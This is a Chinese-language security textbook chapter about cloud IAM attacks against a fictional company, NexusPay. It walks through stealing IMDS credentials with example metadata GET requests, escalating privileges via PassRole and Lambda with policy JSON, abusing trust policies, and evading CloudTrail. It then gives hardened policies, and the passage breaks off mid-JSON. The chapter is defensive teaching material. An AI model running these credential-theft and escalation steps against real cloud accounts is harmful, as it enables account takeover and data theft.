# 第 18 章：雲端 IAM、中繼資料服務與橫向移動

在雲端環境寫後端服務時，很多團隊會把 IAM 角色（Role）、策略（Policy）與實例中繼資料服務（IMDS）當成維運團隊管理的「基礎設施設定」，覺得那不是應用程式的攻擊面。畢竟程式碼裡呼叫 AWS SDK 時都不用寫死長期金鑰，看起來既方便又安全。

但在雲端原生架構裡，**身分與存取管理（IAM）就是新的內網邊界**。當掛了 IAM Role 的雲端主機開著中繼資料端點，而上面的應用程式剛好有一個能讀回回應的 SSRF 漏洞（見第 11 章）且沒強制啟用 IMDSv2 防護（或者攻擊者已經靠第 17 章的手法打進容器與宿主節點，具備符合協定與網路跳數要求的本機發包能力）時，攻擊者就能直接打向 Link-Local 位址領走綁在主機上的臨時安全憑證。

一旦憑證到手，戰場就會從一個受限的小容器，一口氣擴大到整個雲端控制平面。本章就從連線層的封包跳數、IAM 策略評估引擎的求值順序到經典提權原語，拆解 **NexusPay** 雲端環境的橫向移動路線與防禦邊界。

---

## 從你已知的出發

為什麼資安團隊明明在開發部署角色 `nexuspay-dev-deployer` 的 IAM Policy 裡，清清楚楚寫了一條 `Effect: "Deny"` 顯式拒絕存取所有 Secrets Manager 密鑰（`secretsmanager:*`）與 S3 備份桶，攻擊者從 Webhook SSRF 偷到這組開發角色憑證後，還是能輕鬆讀出生產環境的帳本資料庫密碼 `nexuspay/prod/db-credentials`？

因為綁在某個 IAM Role 身上的 `Explicit Deny`，只在「那個角色自己當呼叫者（Caller）」的時候才會被拿出來檢查。只要這個開發角色同時握有 `iam:PassRole`（且 `Resource` 設成偷懶的 `"*"`）加上建立與呼叫 Lambda 函式的權限，攻擊者就能開一支新的 Lambda，把高權限角色 `nexuspay-prod-secrets-reader` 掛上去並觸發它去讀密碼；當 Lambda 發出請求時，呼叫者身分已經換人，原本綁在開發角色身上的 `Explicit Deny` 根本不在求值上下文裡。

---

## 機制與推導

### 攻擊者目標與實質影響

當攻擊者透過應用程式漏洞（如 SSRF、RCE）或節點入侵在雲端工作負載拿到初步立足點後，他們在雲端 IAM 與中繼資料層追求的目標分為三個層次：

第一層是**偷走工作負載的臨時憑證**（Credential Harvesting）。攻擊者會打向 IMDS（`169.254.169.254`）或容器專屬憑證端點（如 ECS 的 `169.254.170.2`），撈出 STS（Security Token Service）臨時金鑰三元組（`AccessKeyId`、`SecretAccessKey`、`SessionToken`）。

最危險的是，這組憑證根本不需要留在受害主機上用——只要目標策略沒有用 `aws:SourceIp` 或 `aws:SourceVpce` 綁死網路來源，攻擊者把這三個字串複製回自己的筆電，就能直接打公網上的雲端 API（像 `sts.amazonaws.com`、`s3.amazonaws.com`），完全繞過公司 VPC 的邊界防火牆與 WAF。

第二層是**順著 IAM 權限圖往上提權**（Control-Plane Privilege Escalation）。單一微服務掛的 IAM Role 通常權限很小，可能只准部署開發環境的 Lambda 或讀某個測試佇列。攻擊者會把當前角色當成起點，在 IAM 策略與資源信任關係裡找尋「提權邊」（Escalation Edge），一步步把低權限角色換成能讀生產密鑰或控制整個雲端帳號的高權限角色。

第三層則是**搬光資料與植入長期後門**（Data Exfiltration & Persistence）。一旦拿到高權限角色，就能直接下載沒做二次加密或條件保護的物件儲存備份（像是 NexusPay 的每日帳本快照 `nexuspay-ledger-backup-prod`），或是乾脆建一個新的 IAM User、偷開一組長效 Access Key、甚至偷改跨帳號的信任策略（Trust Policy），就算原本被打穿的容器重啟了，這條後門依然暢通無阻。

---

### 中繼資料服務邊界：IMDSv1 與 IMDSv2 的線路層差異

在 AWS EC2（以及其他主流公有雲的類似機制）裡，虛擬機上的程式要拿主機資訊或 IAM Role 臨時憑證時，都是直接打 Link-Local 位址 `169.254.169.254`（屬於 RFC 3927 定義的 `169.254.0.0/16` 非路由網段）。這個設計背後有一個大膽的假設：**只有這台主機本機上的行程，才連得到 `169.254.169.254`。**

偏偏當網頁服務出現 SSRF 漏洞時，這個假設就破功了——攻擊者人雖然在公網，卻能叫主機上的後端行程替他發 HTTP 請求。IMDSv1 與 IMDSv2 的設計差異，就是為了斬斷這種「借刀殺人」的代理請求。

#### IMDSv1：一發 GET 就被掏空的無狀態模型

IMDSv1 是最單純的 Request-Response 模型，完全不管呼叫端能不能控制 HTTP 方法或自訂 Header。只要主機還開著 IMDSv1、身上掛了 IAM Role，而上面的服務又有一個能看到回傳內容的 `GET` SSRF，攻擊者在不知道角色名稱時只要打兩發 `GET`（如果已經知道角色名稱，甚至只要一發 `GET`），憑證就到手了：

```http
# 第 1 發 GET：列出這台主機掛的 IAM Role 名稱 (回傳 nexuspay-webhook-role)
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1

# 第 2 發 GET：直接把 AccessKeyId、SecretAccessKey、Token 與 Expiration 整包 JSON 領出來
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/nexuspay-webhook-role HTTP/1.1
```

#### IMDSv2：兩階段 Session 握手與 IPv4 Hop Limit 跳數邊界

為了擋住傳統 SSRF 與設定錯誤的反向代理，IMDSv2 改成了必須「先換票、再讀資料」的兩階段 Session 模型：

1. **第一階段（用 `PUT` 申請 Session Token）**：呼叫端必須對 `/latest/api/token` 發出 `PUT` 請求，而且一定要帶上 `X-aws-ec2-metadata-token-ttl-seconds` 標頭來指定這張 Token 能活幾秒（最長 `21,600 s`，也就是 6 小時）。
2. **看到 `X-Forwarded-For` 直接退件**：只要這筆 `PUT` 請求裡面帶有 `X-Forwarded-For` 標頭，IMDSv2 端點就會當場拒絕（在本章模擬器與標準防護下直接回傳 `400 Bad Request`），一舉擋掉所有經過標準反向代理或 API Gateway 自動貼上轉發標頭的 SSRF 流量。
3. **第二階段（帶著 Token 發 `GET`）**：後面所有讀取中繼資料與憑證的 `GET` 請求，都必須在 Header 附上剛拿到的 `X-aws-ec2-metadata-token: <TOKEN>`。

這三道關卡剛好掐住大多數 SSRF 的死穴：因為絕大多數 SSRF 只能偷換網址，根本沒辦法把 `GET` 改成 `PUT`，更別說塞自訂的 HTTP Header 了。

但問題來了：如果應用程式出的是那種「連 HTTP 方法跟 Header 都能隨便你控」的高階 SSRF，或者攻擊者已經在某個容器裡拿到 RCE（可以直接下 `curl -X PUT`），IMDSv2 還攔得住嗎？這時候，真正站出來守門的就是網路層的 **Hop Limit**（`HttpPutResponseHopLimit`）。

在雲端硬化基準與本章的環境裡，IMDSv2 的 `HttpPutResponseHopLimit` 預設鎖在 **`1`**，用來控制第一階段 `PUT` 回應封包上的 **IPv4 TTL**（Time To Live，存活跳數）。當容器跑在宿主節點的 Bridge / NAT 網路（像 Docker 預設的 `bridge` 或 K8s CNI 虛擬網橋）後面時，回應封包必須經過宿主機核心的路由轉發才能跨進容器的 Network Namespace；而這一次路由轉發，就會把 IPv4 TTL 扣掉 `1` 變成 `0`。

下面我們直接把宿主機本機跟 Bridge 容器內的封包擺在一起，推算一遍 `Hop Limit = 1` 是怎麼靠 IPv4 TTL 把容器擋在門外的：

```text
=== Worked Example 1：IMDSv2 HttpPutResponseHopLimit = 1 線路層與 TTL 推導 ===

[情境 A] 宿主節點本機行程 (10.0.1.50) 直接請求 IMDSv2
1. 請求：
   PUT /latest/api/token HTTP/1.1
   Host: 169.254.169.254
   X-aws-ec2-metadata-token-ttl-seconds: 21600

2. 回應 (由 Hypervisor 虛擬介面直接回送給宿主機，預設 TTL = 1)：
   HTTP/1.1 200 OK
   X-aws-ec2-metadata-token-ttl-seconds: 21600
   Content-Length: 56
   [IPv4 Header: Src=169.254.169.254, Dst=10.0.1.50, TTL=1]

   AQAEAO1x...[56 bytes base64-like token]...

   → 宿主機直接收包，未經過任何路由器轉發 (Hops = 0)。
   → 檢查 TTL = 1 > 0 → 宿主行程成功取得 Token。

----------------------------------------------------------------------

[情境 B] 容器內行程 (172.17.0.2, 位於 docker0 Bridge NAT 後方) 請求 IMDSv2
1. 容器送出 PUT 請求 → 經 veth pair 進入宿主機 docker0 (SNAT 為 10.0.1.50) → 送往 169.254.169.254。
2. Hypervisor 回送 Token 回應封包至宿主機：
   [IPv4 Header: Src=169.254.169.254, Dst=10.0.1.50, TTL=1]
3. 宿主機 Linux 核心查詢 conntrack 還原 DNAT (Dst=172.17.0.2)，準備轉發進 docker0：
   → 核心執行路由轉發規則：TTL_new = TTL_old - 1 = 1 - 1 = 0
   → 因為 TTL_new == 0，核心直接丟棄封包 (Drop)，不會送入容器 veth。
4. 容器端結果：連線逾時 (Timeout)，無法取得任何 Token。

[關鍵安全推論]
若維運人員為了讓容器能用宿主機 Role 而將 Hop Limit 調升為 2：
   TTL_new = 2 - 1 = 1 > 0 → 位於一層 Bridge/NAT 後且未受額外網路政策封鎖的容器即可成功取得 Token！
這會使節點上所有能路由至 169.254.169.254 的 Bridge 容器都能接觸整台宿主節點的高權限 IAM Role（而採用 hostNetwork: true 的容器因不經路由轉發，即使 Hop Limit = 1 也能直接存取，故仍須配合網路封鎖與最小化節點角色權限）。
```

看懂這個 TTL 扣減過程後，在 Kubernetes（EKS）或容器環境裡的防禦原則就非常清楚了：節點的 `HttpPutResponseHopLimit` 一定要鎖死在 `1`，同時設定 `HttpTokens: required` 徹底關掉 IMDSv1（如果叢集裡有開了 `hostNetwork: true` 的 Pod，因為它不走路由轉發，`Hop Limit = 1` 擋不住，還得搭配節點防火牆或 NetworkPolicy 封鎖 `169.254.169.254` 並把節點本身的 Role 權限縮到最小）。

至於個別 Pod 需要的雲端權限，則全面改用 **IRSA**（IAM Roles for Service Accounts）或 **EKS Pod Identity**，發給每個 Pod 各自獨立的短效憑證，絕不讓一般容器去碰宿主節點身上的大角色。

---

### IAM 策略評估邏輯：單一帳號與跨帳號交集

假設攻擊者還是拿到了某組臨時憑證，接下來他能幹什麼，全看 IAM 策略評估引擎怎麼算這張憑證的有效權限（Effective Permissions）。

你可以把 IAM 評估引擎想成第 6 章授權圖的實作版。每一筆打進 AWS 的 API 請求，都會帶著五個維度的資訊：**Principal**（誰發的）、**Action**（想做什麼動作）、**Resource**（目標資源 ARN）、**Condition**（附加條件）以及 **Request Context**（當下的來源 IP、時間、走的 VPC Endpoint 等）。

在同一個 AWS 帳號裡（還沒跨到別人的帳號時），評估引擎是照著下面這四步順序來判定的：

1. **預設全部拒絕（Implicit Deny）**：起跑點永遠是不准。如果翻遍所有相關策略都沒看到半條明確寫著 `Allow` 的規則，結果就是拒絕（Implicit Deny）。
2. **只要撞上一條顯式拒絕，當場出局（Explicit Deny）**：不管在哪一層策略（包含綁在身分上的 Identity Policy、綁在資源上的 Resource Policy、組織層級的 Organizations SCP、角色的 Permissions Boundary 或是 `AssumeRole` 時傳入的 Session Policy），只要命中任何一條 `Effect: "Deny"`，引擎立刻判定拒絕。**Explicit Deny 永遠壓過所有的 Allow。**
3. **通過所有限制邊界的交集閘門（Intersection Gates）**：就算沒撞上 Explicit Deny，靠著身分策略（或同帳號委派給 IAM 主體）拿到的權限，還得同時通過所有限制邊界的 `Allow` 交集才算數：
   - 如果帳號掛在 AWS Organizations 底下（且不是管理帳號），**SCP**（Service Control Policy）必須 `Allow`。
   - 如果這個 IAM Role 或 User 身上掛了 **Permissions Boundary**（權限邊界），那麼透過 Identity Policy（以及沒直接點名該 Role Session 為 Principal 的同帳號授權）行使權限時，Permissions Boundary 也必須同時 `Allow`。
   - 如果呼叫 `sts:AssumeRole` 時還額外傳了限縮用的 **Session Policy**，那就得再跟 Session Policy 取一次交集。
4. **最終放行（Explicit Allow）**：
   - **同帳號內的資源**：對一般服務來說，只要呼叫者的 Identity-based Policy **或者** 目標資源的 Resource-based Policy 其中一邊明確給了 `Allow`（且沒撞上 `Deny`、也通過了邊界交集），請求就放行。不過 KMS 客戶管理金鑰（CMK）是個特例：它的 Key Policy 必須明確授權帳號 `:root` 委派給 IAM，Identity-based Policy 才叫得動它；否則就必須由 Key Policy 直接點名授權該 Principal，或是透過 KMS Grant 放行。
   - **跨帳號的資源**：這時就沒有「二選一」的好事了，而是**嚴格取交集**——呼叫端帳號的 Identity-based Policy 必須 `Allow`，**而且**目標資源帳號的 Resource-based Policy（像是 S3 Bucket Policy 或目標 Role 的 Trust Policy）也必須同時 `Allow`，少一邊都不行。

回到我們開頭問的問題：為什麼很多工程師以為「我在開發角色上加了一條 `Explicit Deny` 擋住 `secretsmanager:*`，它就絕對偷不到生產密碼」，最後卻還是出事？

因為他們忘了一件事：**寫在某個角色 Identity Policy 裡的 `Explicit Deny`，只有在「那個角色自己當請求呼叫者（Caller）」的時候，才會被引擎拿出來算。** 一旦這個角色有本事去啟動或切換到另一個「擁有不同執行身分」的運算實例，新身分發出請求時，評估引擎看的是新身分的策略、資源策略與組織邊界，原本那個角色身上的 `Explicit Deny` 早就被甩在後頭了。

---

### 經典 IAM 提權原語與權限圖推導

用授權圖的角度來看，雲端 IAM 提權就是在找一條有向路徑：怎麼從手上這個低權限起點 `P_0`，一步步跳到高權限目標節點 `P_target`。在雲端資安審查與紅隊演練裡，最常被拿來當跳板的就是下面這三組提權原語：

#### 1. `iam:PassRole` 搭配運算服務（借殼上市）

單看 `iam:PassRole` 這個權限，它既不能讀檔案也不能改資料庫，它的唯一功能，就是允許你把某個 IAM Role「掛載」到雲端運算服務身上。但它只要跟「建立或執行運算資源」的權限湊在一起，就會瞬間變成提權核彈：

- **`iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`**（或靠事件觸發）：攻擊者自己建一支新的 Lambda 函式，把高權限的目標 Role 指定為這支函式的 Execution Role，然後在函式裡寫幾行讀取機密或外傳資料的程式碼，最後呼叫 `InvokeFunction` 讓它跑起來。
- **`iam:PassRole` + `ec2:RunInstances`**：攻擊者直接開一台新的 EC2 虛擬機，把高權限的 Instance Profile 掛上去，並在開機 `UserData` 腳本裡寫一行 `curl http://169.254.169.254/...`，把高權限 Role 的 STS 臨時憑證讀出來打回給自己（就算這台 EC2 在沒有公網 IP 的私有子網，只要能對外連線或寫進共用的儲存桶就能把憑證傳出來）。
- **`iam:PassRole` + `ecs:RegisterTaskDefinition` + `ecs:RunTask`**：套路一模一樣，註冊一個新的容器任務定義，把高權限的 `taskRoleArn` 綁上去，再用自訂映像檔或覆寫啟動指令（`command` override）把容器跑起來。

為什麼這種提權在真實企業裡一抓一大把？因為很多人在寫部署腳本的 IAM Policy 時，圖方便把 `iam:PassRole` 的 `Resource` 直接寫成萬用字元 `"*"`（等於准許它把帳號裡**任何一個角色**掛出去），而且還沒用 `iam:PassedToService` 條件限制它只能傳給哪個雲端服務。

#### 2. `sts:AssumeRole` 與過寬的信任策略（Trust Policy）

每個 IAM Role 都有兩張表：Permissions Policy 管的是「穿上這件角色大衣後能幹嘛」，而 **Trust Policy**（屬於 Resource-based Policy）管的是「誰有資格穿上這件大衣」。在檢查 Trust Policy 時，最常看到三種破口：

```json
// 破口示範：過度信任整個帳號 (:root) 又沒加 ExternalId 的危險 Trust Policy
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "AWS": "arn:aws:iam::123456789012:root" },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

第一種破口是 **`Principal` 開得太寬**。除了最誇張的 `"Principal": { "AWS": "*" }`（要是沒加條件限制，全世界任何 AWS 帳號都能呼叫 `sts:AssumeRole` 進來）之外，最常被誤用的就是上面這段 `"arn:aws:iam::123456789012:root"`。

很多開發者看到 `:root`，以為這代表「只有帳號的 Root 最高管理員才能扮演」；但在 IAM 的規則裡，寫 `:root` 代表**把決定權完全交給這個帳號的 IAM 系統**——只要這個帳號裡任何一個小角色或使用者手上有 `sts:AssumeRole` 權限，通通都能變身成這個高權限角色！

第二種破口是**跨帳號授權漏了 `sts:ExternalId`**（也就是經典的 Confused Deputy 混淆代理人問題）。假設公司買了一套第三方 SaaS 監控平台，對方是用同一個 IAM Principal 去幫所有客戶發 `sts:AssumeRole`，並讓客戶在網頁後台自己填目標 Role ARN。

如果你們在那個 Role 的 Trust Policy 裡沒有強制檢查第三方指派給你們租戶的專屬 `sts:ExternalId`，而第三方平台自己又沒先核對那個 Role ARN 到底是不是你的帳號，同平台上的另一個惡意租戶只要在他的後台填上你們公司的 Role ARN，就能騙那個 SaaS 平台幫他去讀你們公司的雲端資源。

第三種破口則是**自己改表放自己進門**（`iam:UpdateAssumeRolePolicy`）。如果一個低權限角色剛好被給了對某個高權限角色的 `iam:UpdateAssumeRolePolicy` 加上 `sts:AssumeRole` 權限（而且沒被 SCP 或 Permissions Boundary 攔住），就算他原本根本不在 Trust Policy 的名單裡，他也可以先發一筆 API 把高權限角色的 Trust Policy 改掉、把自己加進白名單，下一秒直接呼叫 `sts:AssumeRole` 大搖大擺走進去。

#### 3. `lambda:UpdateFunctionCode`（連 `iam:PassRole` 都省了的直接覆寫）

很多資安團隊吃過虧、把 `iam:PassRole` 鎖死之後，卻忘了回收開發者手上的 `lambda:UpdateFunctionCode` 權限。

試想一下：如果線上環境已經有一支現成的 Lambda 函式（比如每天半夜跑的帳務對帳排程），**它身上本來就已經綁著高權限的 Execution Role**。

這時候，手上有 `lambda:UpdateFunctionCode` 的攻擊者根本不需要新建函式，當然也就完全用不到 `iam:PassRole`——他只要打包一份塞了後門的 ZIP 檔上傳，把那支既有函式的 `$LATEST` 程式碼覆蓋掉，接著等綁在 `$LATEST` 上的排程自動觸發（或是自己配一個 `lambda:InvokeFunction` 直接戳它一下），惡意程式碼就會穿著原本那件高權限大衣直接跑起來。

---

### Worked Example：NexusPay `iam:PassRole` + `Resource: "*"` 提權推導

我們直接拿 **NexusPay** 的雲端帳號（Account ID：`123456789012`）來算一遍真實的 IAM 策略評估過程。

假設攻擊者已經靠著第 11 章的 Webhook SSRF 打穿 EC2 上的 IMDSv1，偷到了開發部署角色 `nexuspay-dev-deployer` 的 STS 臨時憑證。我們先把這個開發角色身上的策略，以及他想染指的高權限目標角色 `nexuspay-prod-secrets-reader` 攤開來看：

```json
// 1. 攻擊者當前持有的角色策略：nexuspay-dev-deployer (Identity-based Policy)
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowDevLambdaDeploy",
      "Effect": "Allow",
      "Action": [
        "lambda:CreateFunction",
        "lambda:InvokeFunction"
      ],
      "Resource": "arn:aws:lambda:ap-northeast-1:123456789012:function:nexuspay-dev-*"
    },
    {
      "Sid": "AllowPassRoleWildcard",
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "*"
    },
    {
      "Sid": "ExplicitDenyProdSecrets",
      "Effect": "Deny",
      "Action": [
        "secretsmanager:*",
        "s3:GetObject"
      ],
      "Resource": "*"
    }
  ]
}
```

```json
// 2. 目標高權限角色：nexuspay-prod-secrets-reader
// (a) Trust Policy (允許 Lambda 服務扮演此角色)
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "Service": "lambda.amazonaws.com" },
      "Action": "sts:AssumeRole"
    }
  ]
}

// (b) Identity-based Policy (可讀取生產資料庫密鑰與帳本備份)
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ReadProdSecretAndLedgerBackup",
      "Effect": "Allow",
      "Action": "secretsmanager:GetSecretValue",
      "Resource": "arn:aws:secretsmanager:ap-northeast-1:123456789012:secret:nexuspay/prod/db-credentials-*"
    },
    {
      "Sid": "ReadLedgerBackup",
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::nexuspay-ledger-backup-prod/*"
    }
  ]
}
```

你看，如果攻擊者直接拿 `nexuspay-dev-deployer` 的憑證去呼叫 `secretsmanager:GetSecretValue`，馬上就會撞上最後一段 `ExplicitDenyProdSecrets` 被擋下來。但看看下面這張評估追蹤表，他只要轉個彎走兩步，就能把那條 `Deny` 徹底甩開：

```text
=== IAM 策略評估追蹤表（從 Explicit Deny 切換至高權限執行上下文）===

步驟 | 呼叫者身分 (Caller Principal) | API Action & Target Resource                  | 策略評估結果
-----+---------------------------------+-----------------------------------------------+------------------------------------------
 0   | nexuspay-dev-deployer           | secretsmanager:GetSecretValue                 | EXPLICIT DENY (命中 ExplicitDenyProdSecrets)
     |                                 | secret:nexuspay/prod/db-credentials-a1b2c3    | → 無法直接讀取
-----+---------------------------------+-----------------------------------------------+------------------------------------------
 1   | nexuspay-dev-deployer           | lambda:CreateFunction                         | ALLOW
     |                                 | FunctionName: nexuspay-dev-audit-tmp          | - Function ARN 匹配 nexuspay-dev-*
     |                                 | Role: role/nexuspay-prod-secrets-reader       | - iam:PassRole 匹配 Resource: "*"
     |                                 |                                               | - 未命中 Deny
-----+---------------------------------+-----------------------------------------------+------------------------------------------
 2   | nexuspay-dev-deployer           | lambda:InvokeFunction                         | ALLOW (命中 AllowDevLambdaDeploy)
     |                                 | FunctionName: nexuspay-dev-audit-tmp          | → Lambda 服務依據 Trust Policy 扮演
     |                                 |                                               |   nexuspay-prod-secrets-reader
-----+---------------------------------+-----------------------------------------------+------------------------------------------
 3   | assumed-role/                   | secretsmanager:GetSecretValue                 | ALLOW
     | nexuspay-prod-secrets-reader/   | secret:nexuspay/prod/db-credentials-a1b2c3    | - 當前身分已切換為 prod-secrets-reader
     | nexuspay-dev-audit-tmp          |                                               | - 原 deployer 的 Explicit Deny 不在上下文內
     |                                 |                                               | - 成功讀取目標密鑰（於預設 AWS/KMS 授權存在時回傳生產資料庫帳號密碼 JSON）
```

這張表把提權的本質攤得一清二楚：**光在低權限角色身上貼 `Explicit Deny` 是擋不住提權的。** 只要那個角色手上有 `iam:PassRole`（`Resource: "*"`）跟建立／觸發運算資源（像 `lambda:CreateFunction` + `lambda:InvokeFunction`）的權限，而且目標高權限角色的 Trust Policy 又剛好准許該運算服務（`lambda.amazonaws.com`）扮演，攻擊者就能借殼跳進另一個不受 `Deny` 限制的新身分裡，把生產環境的資料庫帳密跟帳本備份整碗端走。

---

### 物件儲存暴露與 CloudTrail 偵測邊界

當攻擊者完成提權、拿到高權限憑證之後，第一時間通常就是衝向物件儲存（像 Amazon S3），去翻找帳本備份、客戶 KYC 證件或原始碼封存檔。

#### 物件儲存的核心存取邊界與三個常踩的坑

一個 S3 物件到底能不能被讀走，是由 S3 本身的四道控制層（再疊加上面提過的 Organizations SCP、Permissions Boundary、VPC Endpoint 條件與 SSE-KMS 解密授權）共同決定的：

最外層是 **Account / Bucket Block Public Access**，這是防範公開外洩的總開關（裡面包含 `BlockPublicAcls`、`IgnorePublicAcls`、`BlockPublicPolicy` 與 `RestrictPublicBuckets` 四個子開關）。當這四個開關全打開時，S3 會直接無視既有的公開 ACL（像 `AllUsers` 或 `AuthenticatedUsers`）、禁止任何人新增公開 ACL 或公開 Bucket Policy，並把受公開 Bucket Policy（比如沒加限制的 `Principal: "*"`）涵蓋的存取範圍鎖在獲授權的 AWS 服務與 Bucket 擁有者帳號內，徹底堵死匿名或跨帳號白拿資料的破口。

往內三層則是 **Bucket Policy**（決定誰能從哪個 `aws:SourceIp`、`aws:SourceVpce` 或 `aws:PrincipalOrgID` 連進來）、**IAM Identity Policy**（同帳號內跟 Bucket Policy 取聯集，跨帳號則必須兩邊同時 `Allow`），以及早期留存下來的 **ACL**（Access Control List）。現在最乾淨的做法，是直接把儲存桶設成 `ObjectOwnership: BucketOwnerEnforced` 完全廢掉 ACL，免得哪個老舊上傳腳本順手帶了 `--acl public-read` 就把機密備份公開到全世界。

除了大家熟知的公開設定失誤外，實戰中還有兩個極容易被忽略的邊界陷阱：

第一個是 **Presigned URL 的有效期限與簽發憑證綁定**。後端很常簽發 SigV4 Presigned URL 給前端下載對帳單，而它的權限完全繼承自「簽發那一刻用的憑證」：如果你拿長效的高權限憑證簽了一個有效期長達 7 天（`604,800 s`，即 `X-Amz-Expires=604800`）的下載連結，結果連結不小心留在 Log 或瀏覽器 `Referer` 裡外洩了，撿到連結的人根本不需要有 IAM 身分，在 7 天內（只要符合網路條件）隨時都能直接下載。

反過來說，如果簽發連結時用的是 IMDS 上的臨時 STS 憑證，而那張 STS 憑證再過 `900 s`（15 分鐘）就要到期了，那就算你在網址上大氣地寫了 `X-Amz-Expires=604800`，這條連結最多也只能活 `900 s`——只要背後的 STS 憑證一過期，連結就當場失效。

第二個是 **SSE-KMS 的雙重鎖頭**。如果我們把 `nexuspay-ledger-backup-prod` 儲存桶改成用客戶管理金鑰（CMK）做 SSE-KMS 加密，那就算攻擊者偷到了有 `s3:GetObject` 權限的憑證、通過了 S3 那一關，只要他手上的身分對那把 CMK 沒有有效的 `kms:Decrypt` 解密權限（綜合檢查 KMS Key Policy、同帳號 IAM 委派、KMS Grant 與拒絕條件後沒過），S3 還是解不開檔案，只能回他一個 `403 AccessDenied`。

#### CloudTrail 偵測與預設不記帳的盲區

當攻擊者拿著偷來的憑證在雲端到處逛時，防守方幾乎全靠 **CloudTrail** 日誌來抓人。但如果你只用預設設定，會有一個超大的瞎眼盲區：

**CloudTrail 預設只記「管理事件」（Management Events），完全不記「資料事件」（Data Events）！**

像 `sts:AssumeRole`、`lambda:CreateFunction`（看裡面的 `requestParameters.role` 就能抓到誰用 `iam:PassRole` 把高權限角色塞給了誰）、`iam:UpdateAssumeRolePolicy` 還有 `secretsmanager:GetSecretValue`，這些控制平面的動作都屬於 Management Events，預設都會記下來。

但是高頻率的資料平面動作——特別是 **S3 的 `GetObject` / `PutObject` 以及 Lambda 的 `Invoke`**——因為量太大，AWS 預設是**完全不記錄的**（要另外勾選付費開啟）。這代表如果攻擊者偷到憑證後，不改任何設定，直接默默把 `nexuspay-ledger-backup-prod` 裡面的一萬份帳本備份全部打包下載走，沒開 S3 Data Events 的團隊去翻 CloudTrail，連半條下載紀錄都看不到。

那在有記錄的管理事件裡，要怎麼一眼抓出憑證被偷了？最準的高訊號指標，就是把 **`userIdentity.sessionContext.sessionIssuer` 跟 `sourceIPAddress` 綁在一起看**。當一個照理說只會待在公司 VPC 裡、綁在某台 EC2 上的角色憑證（例如 `assumed-role/nexuspay-webhook-role/i-0abc123...`），突然從某個家用寬頻 IP 或陌生的海外機房 IP 發出 `sts:GetCallerIdentity`、`iam:ListRoles` 或 `lambda:CreateFunction`，那就不用懷疑了，這張憑證八成已經被 SSRF 或 RCE 偷出去了。

另外，老練的攻擊者在拿到最高權限後，第一件事常是呼叫 `cloudtrail:StopLogging` 或 `cloudtrail:DeleteTrail` 把監視器關掉。雖然「關監視器」這一下本身會留下最後一筆紀錄，但為了不讓證據被毀屍滅跡，企業一定要用組織級的 Multi-Account Trail，把所有帳號的 CloudTrail 日誌即時丟進一個獨立的資安稽核專用帳號（Log Archive Account），並在那個儲存桶打開不可竄改的 Object Lock 加上 SCP 防刪規則，讓單一被攻陷的帳號就算拿到 Admin 也刪不掉半行日誌。

---

## 故障模式與防禦

把前面拆解的攻擊鏈收斂起來，雲端 IAM 與中繼資料層最容易出事的破口可以歸納成下面四種故障模式。這些防線不能只寫在團隊 Wiki 上，必須直接寫進 IAM Policy JSON 與 Terraform / CloudFormation 範本裡強制執行：

| 故障模式 | 為什麼會被打穿 | 真正能鎖死邊界的防線 |
|---|---|---|
| **IMDSv1 沒關，或容器 Hop Limit ≥ 2** | 知道角色名時一發 `GET`（不知道時兩發 `GET`）就能拿走憑證；或者 IPv4 TTL 夠長，直接穿過容器 Bridge NAT | 強制設為 `HttpTokens=required`、`HttpPutResponseHopLimit=1`；容器需要雲端權限時一律改走 IRSA 或 Pod Identity |
| **`iam:PassRole` 寫了 `Resource: "*"`** | 部署角色可以把帳號裡的高權限 Role 隨便掛到自己新建的 Lambda 或 EC2 上借殼執行 | 明確列出准許傳遞的單一 Role ARN、加上 `iam:PassedToService` 條件鎖死目標服務，並掛上 Permissions Boundary |
| **Trust Policy 開太寬或准許別人改表** | 寫了 `:root` 讓全帳號都能扮演、跨帳號沒驗 `ExternalId`，或留了 `UpdateAssumeRolePolicy` 讓人自己改白名單 | Trust Policy 只填精確的來源 Role ARN；跨帳號強制核對 `sts:ExternalId`；拔掉非管理員的 `UpdateAssumeRolePolicy` |
| **機密備份沒上 KMS 鎖，且沒開 Data Events** | 只要拿到 `s3:GetObject` 就能在公網搬光備份，而且 CloudTrail 預設根本不記 S3 下載動作 | 全帳號打開 Block Public Access、用 SSE-KMS 雙重驗證 `kms:Decrypt` 並綁定 `aws:SourceVpce` 內網條件、核心機密桶開啟 Data Events |

### 防禦實作基準：鎖死 `PassRole` 與加上 Permissions Boundary

下面我們直接動手修補前面 Worked Example 裡被打穿的 `nexuspay-dev-deployer`。

這組修補做了兩手硬隔離：第一，在它自己的 Identity Policy 裡把 `iam:PassRole` 的 `"*"` 拿掉，鎖死只能傳遞開發專用的低權限執行角色 `nexuspay-dev-lambda-exec`，而且目標服務必須是 `lambda.amazonaws.com`；第二，我們在所有開發環境角色（包含 `deployer` 跟 `dev-lambda-exec`）身上都掛同一張 **Permissions Boundary**，裡面不但限制了 `Allow` 的天花板，還直接寫進 `ExplicitDenyProdSecretsAndBackups` 與防拆邊界的 `DenyBoundaryTampering`：

```json
// 1. 硬化後的 nexuspay-dev-deployer Identity Policy
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowDevLambdaDeployOnlyWithBoundary",
      "Effect": "Allow",
      "Action": [
        "lambda:CreateFunction",
        "lambda:InvokeFunction"
      ],
      "Resource": "arn:aws:lambda:ap-northeast-1:123456789012:function:nexuspay-dev-*"
    },
    {
      "Sid": "RestrictPassRoleToDevExecutionRoleOnly",
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::123456789012:role/nexuspay-dev-lambda-exec",
      "Condition": {
        "StringEquals": {
          "iam:PassedToService": "lambda.amazonaws.com"
        }
      }
    }
  ]
}
```

```json
// 2. 掛載於開發環境所有角色（含 deployer 與 dev-lambda-exec）的 Permissions Boundary
{
  "Version": "2012-10-17",
  "Statement": [
    {
